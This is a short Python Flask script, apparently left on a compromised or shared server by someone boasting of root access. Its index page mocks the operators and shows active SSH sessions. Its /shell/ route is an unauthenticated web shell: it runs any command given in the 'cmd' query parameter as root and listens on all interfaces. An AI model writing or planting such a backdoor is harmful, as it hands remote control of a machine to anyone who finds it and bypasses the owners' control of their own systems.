from flask import Flask, request
import subprocess

app=Flask(__name__)

@app.route('/')
def lol():
  return f"<p>i love the initiative but me having root access to any system, even if it's a VPS is funny. Probably was intended but still come on security professionals.<br>Active SSH connections<br></p><center>{subprocess.check_output(['w']).decode()}</center>"
  
@app.route('/shell/')
def shell():
    try:
        s=request.args["cmd"]
        return subprocess.check_output(s.split()).decode()
    except:
        return "use cmd parameter to access the shell. it's running on root fren"


app.run(host="0.0.0.0", port=69)
